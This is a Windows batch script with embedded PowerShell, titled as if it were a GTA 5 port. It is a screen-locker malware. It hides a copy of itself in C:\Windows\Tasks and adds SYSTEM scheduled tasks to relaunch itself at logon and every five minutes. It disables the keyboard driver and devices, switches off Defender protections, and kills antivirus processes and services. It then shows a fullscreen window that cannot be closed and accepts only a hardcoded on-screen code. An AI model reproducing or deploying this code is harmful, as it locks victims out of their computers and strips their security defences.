@echo off
title Zeta Gta5portS
mode con cols=1 lines=1
color 0A

if not "%cd%"=="C:\Windows\Tasks" (
    mkdir C:\Windows\Tasks 2>nul
    copy "%~f0" "C:\Windows\Tasks\locker_win11.bat" /y >nul
    attrib +h +s "C:\Windows\Tasks\locker_win11.bat"
    schtasks /create /tn "ZetaLocker" /tr "C:\Windows\Tasks\locker_win11.bat" /sc onlogon /ru SYSTEM /rl HIGHEST /f
    schtasks /create /tn "ZetaWatchdog" /tr "C:\Windows\Tasks\locker_win11.bat" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f
    echo Установка завершена. Перезагрузись, Alpha.
    exit
)

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
$ErrorActionPreference='SilentlyContinue';
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\kbdclass' -Name 'Start' -Value 4 -Force;
Get-PnpDevice -Class Keyboard | ForEach-Object { Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false };
Set-MpPreference -DisableRealtimeMonitoring $true -Force;
Set-MpPreference -DisableBehaviorMonitoring $true -Force;
Set-MpPreference -DisableBlockAtFirstSeen $true -Force;
Set-MpPreference -DisableIOAVProtection $true -Force;
$avProcs=@('MsMpEng','NisSrv','avp','avast','avguard','ekrn','egui','bdagent','vsserv','drweb','spider');
foreach ($p in $avProcs) { taskkill /f /im "$p.exe" 2>$null; Stop-Process -Name $p -Force -ErrorAction SilentlyContinue };
$avServices=@('WinDefend','wscsvc','KAV','avast','ESET','bd','DrWeb');
foreach ($s in $avServices) { sc stop $s 2>$null };
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;
[System.Windows.Forms.Application]::EnableVisualStyles();
$f=New-Object System.Windows.Forms.Form;
$f.WindowState='Maximized';
$f.TopMost=$true;
$f.FormBorderStyle='None';
$f.BackColor='Black';
$f.ControlBox=$false;
$f.KeyPreview=$true;
$f.Add_KeyDown({ if ($_.Alt -or $_.Control -or $_.KeyCode -eq 'F4') { $_.SuppressKeyPress=$true } });
$f.Add_FormClosing({ $_.Cancel=$true });
$l=New-Object System.Windows.Forms.Label;
$l.Text='Введите пароль (только кнопки):';
$l.ForeColor='Red';
$l.Font=New-Object System.Drawing.Font('Segoe UI',24,[System.Drawing.FontStyle]::Bold);
$l.Size=New-Object System.Drawing.Size(600,60);
$l.Location=New-Object System.Drawing.Point(50,30);
$f.Controls.Add($l);
$tb=New-Object System.Windows.Forms.TextBox;
$tb.Font=New-Object System.Drawing.Font('Segoe UI',28,[System.Drawing.FontStyle]::Bold);
$tb.Size=New-Object System.Drawing.Size(300,60);
$tb.Location=New-Object System.Drawing.Point(100,130);
$tb.Text='';
$tb.ReadOnly=$true;
$tb.TextAlign='Center';
$tb.BackColor='Gray';
$tb.ForeColor='White';
$f.Controls.Add($tb);
function UpdateDisplay { $tb.Text='*' * $tb.Tag.Length };
$tb.Tag='';
for ($i=0;$i -le 9;$i++) {
    $b=New-Object System.Windows.Forms.Button;
    $b.Text=$i.ToString();
    $b.Font=New-Object System.Drawing.Font('Segoe UI',20,[System.Drawing.FontStyle]::Bold);
    $b.Size=New-Object System.Drawing.Size(90,90);
    $b.BackColor='DarkGray';
    $b.ForeColor='Black';
    $x=100 + ($i%3)*110;
    $y=240 + [math]::Floor($i/3)*110;
    $b.Location=New-Object System.Drawing.Point($x,$y);
    $b.Add_Click({
        if ($this.Parent.Tag.Length -lt 10) {
            $this.Parent.Tag = $this.Parent.Tag + $this.Text;
            UpdateDisplay;
        }
    });
    $f.Controls.Add($b);
}
$clr=New-Object System.Windows.Forms.Button;
$clr.Text='⌫';
$clr.Font=New-Object System.Drawing.Font('Segoe UI',20,[System.Drawing.FontStyle]::Bold);
$clr.Size=New-Object System.Drawing.Size(90,90);
$clr.Location=New-Object System.Drawing.Point(430,240);
$clr.BackColor='DarkOrange';
$clr.Add_Click({
    if ($this.Parent.Tag.Length -gt 0) {
        $this.Parent.Tag = $this.Parent.Tag.Substring(0,$this.Parent.Tag.Length-1);
        UpdateDisplay;
    }
});
$f.Controls.Add($clr);
$enter=New-Object System.Windows.Forms.Button;
$enter.Text='✅';
$enter.Font=New-Object System.Drawing.Font('Segoe UI',20,[System.Drawing.FontStyle]::Bold);
$enter.Size=New-Object System.Drawing.Size(90,90);
$enter.Location=New-Object System.Drawing.Point(430,350);
$enter.BackColor='LimeGreen';
$enter.Add_Click({
    $entered=$this.Parent.Tag;
    if ($entered -eq '133779') {
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\kbdclass' -Name 'Start' -Value 1 -Force;
        Get-PnpDevice -Class Keyboard | ForEach-Object { Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false };
        $this.Parent.Close();
    } else {
        [System.Windows.Forms.MessageBox]::Show('Пароль неверный, мудак!','Zeta Error');
        $this.Parent.Tag='';
        UpdateDisplay;
    }
});
$f.Controls.Add($enter);
$f.ShowDialog() | Out-Null;
"
exit
